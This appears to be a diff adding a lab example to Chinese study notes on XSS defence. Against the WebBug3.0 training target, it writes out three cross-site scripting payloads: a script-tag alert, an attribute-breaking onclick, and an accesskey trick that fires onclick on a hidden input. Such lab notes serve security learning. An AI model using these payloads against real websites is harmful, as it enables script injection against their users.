@@ -214,3 +214,53 @@ XSS防御的总体思路是：**对输入(和URL参数)进行过滤，对输出�
    **ALLOW-FROM uri** 
    表示该页面可以在指定来源的 frame 中展示。 
    换一句话说，如果设置为 DENY，不光在别人的网站 frame 嵌入时会无法加载，在同域名页面中同样会无法加载。另一方面，如果设置为 SAMEORIGIN，那么页面就可以在同域名页面的 frame 中嵌套。
+
+
+
+
+
+
+
+### 实例：被hidden的标签实现xss
+
+目标服务器：WebBug3.0
+
+通过AWVS扫描出存在xss漏洞
+
+![image-20220519113329579](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20220519113329579.png)
+
+手动测试一下：
+
+![image-20220519113437341](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20220519113437341.png)
+
+poc如下：
+
+```
+dog_cat.jpg'"()&%<acx><ScRiPt >alert(/xss/)</ScRiPt>
+```
+
+![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220519141929.png)
+
+闭合双引号尝试用onclick事件弹窗
+
+```
+dog_cat.jpg "onclick="alert(/xss/)"&submit=下载
+```
+
+![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220519142633.png)
+
+但是，标签有hidden属性，便签被隐藏导致弹窗无法显示，可以通过设置快捷键的方式是弹窗成功弹出
+
+```
+pic=dog_cat.jpg" accesskey="x" onclick="alert(/xss/)&submit=下载
+```
+
+![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220519145006.png)
+
+各种浏览器的快捷键
+
+![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220519145134.png)
+
+触发快捷键即可弹出xss窗口
+
+![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220519145220.png)
